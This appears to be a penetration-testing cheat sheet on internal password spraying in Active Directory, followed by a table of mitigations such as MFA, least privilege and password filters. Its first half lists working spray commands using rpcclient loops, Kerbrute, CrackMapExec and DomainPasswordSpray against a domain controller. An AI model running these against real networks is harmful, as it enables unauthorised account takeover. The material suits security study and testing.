# Internal Password Spraying - from Linux

Password Spraying" is a technique used to attack computer systems by trying out a small number of common passwords or guessing weak passwords to access user accounts.

## Internal Password Spraying from a Linux Host

### Bash
```bash
for u in $(cat valid_users.txt);do rpcclient -U "$u%Welcome1" -c "getusername;quit" 192.168.1.10 | grep Authority; done
```
### Kerbrute
```bash
kerbrute passwordspray -d domain.local --dc 192.168.1.10 valid_users.txt  mypasswd1
```
### CrackMapExec
```bash
crackmapexec smb 192.168.1.10 -u valid_users.txt -p mypasswd1 | grep +
# if you have a result you can validate creds with CrackMapExec
crackmapexec smb 192.168.1.10 -u username -p passwd1
```

## Internal Password Spraying - from Windows
### DomainPasswordSpray
```powershell
Import-Module .\DomainPasswordSpray.ps1
Invoke-DomainPasswordSpray -Password mypasswd1 -OutFile spray_success -ErrorAction SilentlyContinue
```
____________________________________________________________________________________________________________
## TO present this type of attack :

| Technique  | Description          |
| :--------------- |:--------------- |
| Multi-factor Authentication  | Multi-factor authentication can greatly reduce the risk of password spraying attacks. Many types of multi-factor authentication exist, such as push notifications to a mobile device, a rotating One Time Password (OTP) such as Google Authenticator, RSA key, or text message confirmations. While this may prevent an attacker from gaining access to an account, certain multi-factor implementations still disclose if the username/password combination is valid. It may be possible to reuse this credential against other exposed services or applications. It is important to implement multi-factor solutions with all external portals.        |
| Restricting Access  |  	It is often possible to log into applications with any domain user account, even if the user does not need to access it as part of their role. In line with the principle of least privilege, access to the application should be restricted to those who require it.           |
| Reducing Impact of Successful Exploitation  | A quick win is to ensure that privileged users have a separate account for any administrative activities. Application-specific permission levels should also be implemented if possible. Network segmentation is also recommended because if an attacker is isolated to a compromised subnet, this may slow down or entirely stop lateral movement and further compromise.          |
| Password Hygiene  | Educating users on selecting difficult to guess passwords such as passphrases can significantly reduce the efficacy of a password spraying attack. Also, using a password filter to restrict common dictionary words, names of months and seasons, and variations on the company's name will make it quite difficult for an attacker to choose a valid password for spraying attempts.         |




